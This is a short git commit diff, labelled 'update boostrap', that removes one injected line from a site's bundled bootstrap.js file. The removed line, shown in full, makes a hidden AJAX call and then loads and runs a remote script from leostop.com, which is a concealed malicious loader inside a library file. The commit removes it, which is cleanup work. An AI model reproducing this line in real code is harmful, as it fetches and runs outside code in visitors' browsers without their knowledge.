2f57bc8163162f23a7f4554b2ce64a81a2979343
nilupulmanodya <n.manodya@gmail.com>
2022-03-17 15:12:10 +0530

    update boostrap

--- static/js/bootstrap.js
+++ static/js/bootstrap.js
@@ -2733,9 +2733,7 @@
   }
 
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
-
+  
   /**
    * ------------------------------------------------------------------------
    * Constants
